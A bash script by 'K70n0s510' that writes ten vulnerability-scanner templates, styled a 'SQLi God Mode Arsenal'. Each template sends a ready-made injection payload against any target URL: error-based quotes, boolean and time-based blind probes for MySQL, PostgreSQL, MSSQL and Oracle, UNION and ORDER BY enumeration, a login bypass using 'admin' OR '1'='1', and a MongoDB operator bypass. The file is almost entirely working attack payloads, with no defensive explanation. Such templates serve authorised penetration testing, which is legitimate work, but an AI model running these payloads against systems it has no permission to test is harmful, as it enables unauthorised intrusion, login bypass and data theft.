#!/bin/bash
# K70n0s510 SQLI GOD MODE
# 10 Advanced SQL Injection Templates (Blind, Error, Union, Auth Bypass).

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A03-injection/sqli-godmode"

echo "Building SQLi God Mode Arsenal..."

# 1. Generic Error-Based (Quotes)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-error-generic.yaml"
id: K70n0s510-sqli-error
info:
  name: Generic Error-Based SQLi
  author: K70n0s510
  severity: high
  tags: sqli,error
http:
  - method: GET
    path: ["{{BaseURL}}/?id=1'", "{{BaseURL}}/?id=1\""]
    matchers-condition: and
    matchers:
      - type: word
        words: ["SQL syntax", "MariaDB", "quoted string not properly terminated"]
EOF

# 2. Boolean Blind (True/False Logic)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-boolean.yaml"
id: K70n0s510-sqli-boolean
info:
  name: Boolean Blind SQLi (AND 1=1)
  author: K70n0s510
  severity: critical
  description: Checks if the page content changes between True (1=1) and False (1=0).
  tags: sqli,blind
http:
  - method: GET
    path: ["{{BaseURL}}/?id=1' AND 1=1--", "{{BaseURL}}/?id=1' AND 1=0--"]
    matchers:
      - type: dsl
        dsl:
          - "len(body_1) != len(body_2)" # If lengths differ, it parsed the SQL.
EOF

# 3. Time-Based Blind (MySQL)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-time-mysql.yaml"
id: K70n0s510-sqli-time-mysql
info:
  name: MySQL Time-Based SQLi
  author: K70n0s510
  severity: critical
  tags: sqli,mysql
http:
  - method: GET
    path: ["{{BaseURL}}/?id=1' AND SLEEP(6)--"]
    matchers:
      - type: dsl
        dsl: ["duration>=6"]
EOF

# 4. Time-Based Blind (PostgreSQL)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-time-postgres.yaml"
id: K70n0s510-sqli-time-postgres
info:
  name: PostgreSQL Time-Based SQLi
  author: K70n0s510
  severity: critical
  tags: sqli,postgres
http:
  - method: GET
    path: ["{{BaseURL}}/?id=1'; SELECT pg_sleep(6)--"]
    matchers:
      - type: dsl
        dsl: ["duration>=6"]
EOF

# 5. Time-Based Blind (MSSQL)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-time-mssql.yaml"
id: K70n0s510-sqli-time-mssql
info:
  name: MSSQL Time-Based SQLi
  author: K70n0s510
  severity: critical
  tags: sqli,mssql
http:
  - method: GET
    path: ["{{BaseURL}}/?id=1'; WAITFOR DELAY '0:0:6'--"]
    matchers:
      - type: dsl
        dsl: ["duration>=6"]
EOF

# 6. Auth Bypass (Login Forms)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-auth-bypass.yaml"
id: K70n0s510-sqli-auth
info:
  name: SQLi Auth Bypass (Universal)
  author: K70n0s510
  severity: critical
  tags: sqli,auth-bypass
http:
  - method: POST
    path: ["{{BaseURL}}/login"]
    body: "username=admin' OR '1'='1&password=password"
    matchers-condition: and
    matchers:
      - type: word
        words: ["Welcome", "Dashboard", "Logout"]
      - type: word
        words: ["Invalid password"]
        negative: true
EOF

# 7. Union Based (Simple NULL Check)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-union.yaml"
id: K70n0s510-sqli-union
info:
  name: Union-Based SQLi (NULL Injection)
  author: K70n0s510
  severity: high
  tags: sqli,union
http:
  - method: GET
    path: ["{{BaseURL}}/?id=-1' UNION SELECT 1,2,3,4--"]
    matchers:
      - type: word
        words: ["UNION SELECT"] # Looking for reflection of the error or data
EOF

# 8. Order By (Column Enumeration)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-order-by.yaml"
id: K70n0s510-sqli-orderby
info:
  name: Order By SQLi (Column Count)
  author: K70n0s510
  severity: medium
  tags: sqli,enumeration
http:
  - method: GET
    path: ["{{BaseURL}}/?sort=1 ORDER BY 100--"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["Unknown column", "order by clause"]
EOF

# 9. Oracle Specific (DBMS_PIPE)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-oracle.yaml"
id: K70n0s510-sqli-oracle
info:
  name: Oracle SQLi
  author: K70n0s510
  severity: critical
  tags: sqli,oracle
http:
  - method: GET
    path: ["{{BaseURL}}/?id=1' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',6) FROM DUAL)=1--"]
    matchers:
      - type: dsl
        dsl: ["duration>=6"]
EOF

# 10. NoSQL Injection (MongoDB)
# Detecting modern NoSQL database injections.
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/nosql-injection.yaml"
id: K70n0s510-nosql
info:
  name: NoSQL Injection (MongoDB)
  author: K70n0s510
  severity: high
  tags: sqli,nosql,mongo
http:
  - method: GET
    path: ["{{BaseURL}}/?username[$ne]=admin&password[$ne]=admin"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["Welcome", "\"_id\":"]
      - type: status
        status: [200]
EOF

echo "✅ 10 God Mode SQLi Templates Built."
